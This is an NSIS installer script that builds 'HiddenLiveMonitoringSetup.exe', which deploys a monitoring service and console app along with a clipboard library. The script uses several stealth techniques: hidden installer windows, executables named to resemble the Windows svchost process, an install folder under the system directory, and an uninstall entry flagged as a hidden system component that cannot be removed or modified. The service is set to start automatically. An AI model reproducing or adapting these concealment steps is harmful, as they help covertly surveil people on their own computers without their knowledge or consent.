; Script generated by the HM NIS Edit Script Wizard.

!define Service_Exe_Filename "svcrshost"
!define Service_Exe_FilenameEx "svcrshost.exe"
!define Console_Exe_Filename "svcrhost"
!define Console_Exe_FilenameEx "svcrhost.exe"


; HM NIS Edit Wizard helper defines
!define PRODUCT_NAME "LiveMonitoring"
!define PRODUCT_VERSION "1.0"
!define PRODUCT_PUBLISHER "LMSRegal"
!define PRODUCT_WEB_SITE "http://www.regaloutsourceindia.com"
!define PRODUCT_DIR_REGKEY "Software\Microsoft\Windows\CurrentVersion\App Paths\${Service_Exe_FilenameEx}"
!define PRODUCT_UNINST_KEY "Software\Microsoft\Windows\CurrentVersion\Uninstall\Livemon"
!define PRODUCT_UNINST_ROOT_KEY "HKLM"
!define SERVICE_NAME "${Service_Exe_Filename}"
!define SERVICE_DISPLAY_NAME "${Service_Exe_Filename}"
!define Console_Application "${Console_Exe_FilenameEx}"



;!include "WinMessages.nsh"
; MUI 1.67 compatible ------
!include "MUI.nsh"
!include nsDialogs.nsh
!include Sections.nsh
!addplugindir "Data\NSISFiles\"
!addplugindir "Data\NSISFiles\NSIS_Simple_Service_Plugin_1.30\"
!addincludedir  "Data\NSISFiles\"
!include "nsProcess.nsh"

var Quitcount
var InstallType
var IsConsoleRun

!define MUI_ABORTWARNING
!define MUI_ICON "Image\rgl_logo_large.ico"
;!define MUI_UNICON "${NSISDIR}\Contrib\Graphics\Icons\modern-uninstall.ico"
!define MUI_UNICON "Image\rgl_logo_large.ico"

Section

SectionEnd

;custom Repair and Remove Page if Setup already installed
Page custom CheckAllreadyInstalledOnPC 

Page custom StopAppAndSeriveIfInstalled 

Page custom InstallProgrambyCustomFunction 




; Language files
!insertmacro MUI_LANGUAGE "English"

; MUI end ------

Name "${PRODUCT_NAME} ${PRODUCT_VERSION}"
OutFile "HiddenLiveMonitoringSetup.exe"


InstallDir "$SYSDIR\sysr"



InstallDirRegKey HKLM "${PRODUCT_DIR_REGKEY}" ""
ShowInstDetails show
ShowUnInstDetails show


Function .onInit
HideWindow
	InitPluginsDir
	File /oname=$PLUGINSDIR\imagerepair.bmp "Image\repair.bmp"
	File /oname=$PLUGINSDIR\imageremove.bmp "Image\remove.bmp"
	File /oname=$PLUGINSDIR\imagecor.bmp "Image\cor.bmp"

        
FunctionEnd

Function un.onUninstSuccess
  HideWindow
FunctionEnd

Function un.onInit
  ;MessageBox MB_ICONQUESTION|MB_YESNO|MB_DEFBUTTON2 "Are you sure you want to completely remove $(^Name) and all of its components?" IDYES +2
  ;Abort
FunctionEnd

Section Uninstall
  
SectionEnd

Function CheckAllreadyInstalledOnPC
HideWindow

ReadRegStr $R0 HKLM \
  "Software\Microsoft\Windows\CurrentVersion\Uninstall\Livemon" \
  "UninstallString"
 IfFileExists $R0 0 file_not_found
StrCpy $0 "the file was found"
goto install
file_not_found:
StrCpy $0 "the file was NOT found"
StrCpy $InstallType New
goto notinstall

install:
;Allready install so remove
StrCpy $InstallType Remove
notinstall:
FunctionEnd

Function StopAppAndSeriveIfInstalled

 TryAgain:
	${nsProcess::FindProcess} "${Console_Application}" $R0
	StrCpy $IsConsoleRun $R0
	${if} $IsConsoleRun == 0
              ${nsProcess::KillProcess} "${Console_Application}" $R0
                  StrCpy $IsConsoleRun $R0
                         ${if} $IsConsoleRun == 0
                         
                         ${else}
                                ${if} $Quitcount == +1+1+1
                                   MessageBox MB_ICONStop|MB_OK "Running not terminated by installer, Error Level :- $R0"
                                   Quit
                             ${else}
                                Strcpy $Quitcount $Quitcount+1
                             ${endif}
                                     goto TryAgain
	                 ${Endif}
                ${else}
                       ${if} $IsConsoleRun == 603
                             goto Finish
                       ${else}
                              MessageBox MB_ICONStop|MB_OK "Running not terminated by installer, Error Level :- $R0"
                              Quit
                       ${Endif}
               
               goto TryAgain
	${Endif}
	Finish:


; Check if the service exists
		  SimpleSC::ExistsService "${SERVICE_NAME}"
		  Pop $0 ; returns an errorcode if the service doesn�t exists (<>0)/service exists (0)
		${If} $0 = 0
		;Code For if Exist Sercive
		  ; Check if the service is running
		  SimpleSC::ServiceIsRunning "${SERVICE_NAME}"
		  Pop $0 
		  Pop $1 
				${If} $1 = 0
					;MessageBox MB_ICONSTOP "Not Running Service!"
				${Else}
					  SimpleSC::ServiceIsStopped "${SERVICE_NAME}"
					  Pop $0 ; 
					  Pop $1 ; returns 1 (service is stopped) - returns 0 (service is not stopped)
						  ${If} $1 = 0
							SimpleSC::StopService "${SERVICE_NAME}" 1 40
							Pop $0 ; returns an errorcode (<>0) otherwise success (0)
						  ${Else}
						  
						  ${EndIf}
				${EndIf}
		${Else}
		       ;MessageBox MB_ICONSTOP "Service not Exist!"
		${EndIf}

		
		

FunctionEnd

Function  InstallProgrambyCustomFunction
 ${If} $InstallType == Remove
 
 SimpleSC::RemoveService "${SERVICE_NAME}"
			Pop $0 ; returns an errorcode (<>0) otherwise success (0)
			${If} $0 = 0
				;MessageBox MB_ICONINFORMATION "Service Removed Successfully!"
			${Else}
				MessageBox MB_ICONSTOP "Service not Removed!"
			${EndIf}
 
 
 ;Unistall Application ;All Exe and config files
 Delete "$INSTDIR\LiveMoniUninst.exe"
  Delete "$INSTDIR\${Console_Exe_FilenameEx}"
  Delete "$INSTDIR\${Service_Exe_FilenameEx}"
  Delete "$INSTDIR\APIR.dll"
  Delete "$INSTDIR\D.Net.Clipboard.dll"
  Delete "$INSTDIR\Microsoft.Win32Ex.dll"
  Delete "$INSTDIR\NDde.dll"
  Delete "$INSTDIR\Newtonsoft.Json.dll"
  Delete "$INSTDIR\System.Net.Http.dll"
  Delete "$INSTDIR\System.Net.Http.Formatting.dll"

  RMDir /r "$INSTDIR"
  
  DeleteRegKey ${PRODUCT_UNINST_ROOT_KEY} "${PRODUCT_UNINST_KEY}"
  DeleteRegKey HKLM "${PRODUCT_DIR_REGKEY}"
  
  Sleep 1000
              SetOutPath "$TEMP"
              RMDir /r "$INSTDIR"
			  
  	;MessageBox MB_ICONINFORMATION "Unistall Application successfully!"
  SetAutoClose true
 
  
 
 ${Else}
 
 ;install Application start
 SetOutPath "$INSTDIR"
  SetOverwrite on
  ;All Dll Files
  File "Data\APIR.dll"
  File "Data\D.Net.Clipboard.dll"
  File "Data\Microsoft.Win32Ex.dll"
  File "Data\NDde.dll"
  File "Data\Newtonsoft.Json.dll"
  File "Data\System.Net.Http.dll"
  File "Data\System.Net.Http.Formatting.dll"
  
  ;All Exe and config files
  File "Data\${Service_Exe_FilenameEx}"
  File "Data\${Console_Exe_FilenameEx}"
  ;File "${NSISDIR}\LMD\APP\svlmhost.exe.config"
		
		${If} $InstallType == New
			SimpleSC::ExistsService "${SERVICE_NAME}"
				  Pop $0 ; returns an errorcode if the service doesn�t exists (<>0)/service exists (0)
				${If} $0 <> 0
					;MessageBox MB_ICONINFORMATION "Service Installation start !"
						SimpleSC::InstallService "${SERVICE_NAME}" "${SERVICE_DISPLAY_NAME}" "16" "2" "$INSTDIR\${Service_Exe_FilenameEx}" "" "" ""
						Pop $0 ; returns an errorcode (<>0) otherwise success (0)
						${If} $0 <> 0
							MessageBox MB_ICONSTOP "Error in Service Installation Process !"
						${Else}

						${EndIf}
				${Else}
					;MessageBox MB_ICONINFORMATION "Service already Installed on your computer "
				${EndIf}
		${EndIf}
 
 
  WriteUninstaller "$INSTDIR\LiveMoniUninst.exe"
  WriteRegStr HKLM "${PRODUCT_DIR_REGKEY}" "" "$INSTDIR\${Service_Exe_FilenameEx}"
  WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} "${PRODUCT_UNINST_KEY}" "DisplayName" "$(^Name)"
  WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} "${PRODUCT_UNINST_KEY}" "UninstallString" "$INSTDIR\LiveMoniUninst.exe"
  WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} "${PRODUCT_UNINST_KEY}" "DisplayIcon" "$INSTDIR\${Service_Exe_FilenameEx}"
  WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} "${PRODUCT_UNINST_KEY}" "DisplayVersion" "${PRODUCT_VERSION}"
  WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} "${PRODUCT_UNINST_KEY}" "URLInfoAbout" "${PRODUCT_WEB_SITE}"
  WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} "${PRODUCT_UNINST_KEY}" "Publisher" "${PRODUCT_PUBLISHER}"
  WriteRegDWORD ${PRODUCT_UNINST_ROOT_KEY} "${PRODUCT_UNINST_KEY}" "SystemComponent" "1"
  WriteRegDWORD ${PRODUCT_UNINST_ROOT_KEY} "${PRODUCT_UNINST_KEY}" "NoRemove" "1"
  WriteRegDWORD ${PRODUCT_UNINST_ROOT_KEY} "${PRODUCT_UNINST_KEY}" "NoModify" "1"
 
  Sleep 1000
 ;install Application Stop
  SimpleSC::StartService "${SERVICE_NAME}" "" 30
                Pop $0 ; returns an errorcode (<>0) otherwise success (0)
	        ${If} $0 = 0
	         
	        ; MessageBox MB_ICONINFORMATION "Process start successfully!"
	        ${EndIf}
 
 
  ${EndIf}
FunctionEnd


